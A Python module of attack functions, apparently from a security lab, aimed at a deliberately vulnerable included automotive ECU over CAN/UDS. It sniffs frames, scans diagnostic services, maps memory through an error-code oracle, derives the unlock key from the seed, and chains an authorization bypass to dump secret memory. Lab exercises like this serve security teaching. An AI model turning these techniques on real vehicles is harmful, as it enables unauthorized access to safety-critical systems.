"""Attack primitives against the lab target: sniff, scan, unlock, dump.

Each maps to a documented weakness (see docs/VULNERABILITIES.md). For education /
research against the included target only.
"""

from __future__ import annotations

from . import isotp, uds
from .client import UdsClient


def sniff(bus, count: int = 20, timeout: float = 2.0):
    """Yield up to ``count`` raw CAN frames seen on the bus."""
    seen = 0
    while seen < count:
        msg = bus.recv(timeout)
        if msg is None:
            break
        can_id, data = msg
        seen += 1
        yield can_id, data


def scan_services(client: UdsClient, sids=None) -> list[int]:
    """Return the service IDs the ECU does not reject as serviceNotSupported."""
    if sids is None:
        sids = [uds.SID_DSC, uds.SID_READ_DID, uds.SID_WRITE_DID,
                uds.SID_READ_MEMORY, uds.SID_SECURITY_ACCESS,
                uds.SID_TESTER_PRESENT]
    supported = []
    for sid in sids:
        # A bare SID is usually a length error for supported services, and
        # serviceNotSupported (0x11) for unsupported ones.
        try:
            client.request_parsed(bytes([sid]))
            supported.append(sid)
        except uds.NegativeResponse as nr:
            if nr.nrc != 0x11:  # anything but serviceNotSupported means "present"
                supported.append(sid)
        except isotp.IsoTpError:
            pass
    return supported


def map_memory(client: UdsClient, max_addr: int = 0x300, step: int = 0x10) -> int:
    """Use the NRC oracle (weakness #5) to find where memory ends while locked.

    Returns the first address that answers requestOutOfRange (0x31) instead of
    securityAccessDenied (0x33)."""
    last_protected = 0
    for addr in range(0, max_addr, step):
        try:
            client.request_parsed(uds.read_memory(addr, 1))
            last_protected = addr  # readable (already authorized)
        except uds.NegativeResponse as nr:
            if nr.nrc == 0x33:
                last_protected = addr
            elif nr.nrc == 0x31:
                return last_protected + step
    return last_protected + step


def recover_key(client: UdsClient, level: int = 1) -> int:
    """Weaknesses #1/#2: request a seed and derive the key, no brute force."""
    resp = client.request(uds.security_request_seed(level))
    seed = uds.seed_from_response(resp)
    return uds.derive_key(seed)


def unlock(client: UdsClient, level: int = 1) -> bool:
    """Unlock SecurityAccess by deriving the key from the seed."""
    key = recover_key(client, level)
    try:
        sid, _ = client.request_parsed(uds.security_send_key(level, key))
        return sid == uds.SID_SECURITY_ACCESS
    except uds.NegativeResponse:
        return False


def dump_memory(client: UdsClient, start: int, length: int, chunk: int = 16) -> bytes:
    """Read ``length`` bytes from ``start`` via ReadMemoryByAddress."""
    out = bytearray()
    addr = start
    remaining = length
    while remaining > 0:
        n = min(chunk, remaining)
        sid, payload = client.request_parsed(uds.read_memory(addr, n, addr_len=2))
        out += payload
        addr += n
        remaining -= n
    return bytes(out)


def run_exploit(bus, req_id: int = 0x7E0, resp_id: int = 0x7E8) -> bytes:
    """Full chain: recon -> abuse the auth bypass -> dump and return the secret.

    Demonstrates weakness #4: only a seed request (no valid key) is needed before
    ReadMemoryByAddress serves protected memory."""
    client = UdsClient(bus, req_id, resp_id)
    # Trigger the buggy authorization gate, then dump the secret region.
    client.request(uds.security_request_seed(1))
    return dump_memory(client, 0xC0, 0x20)
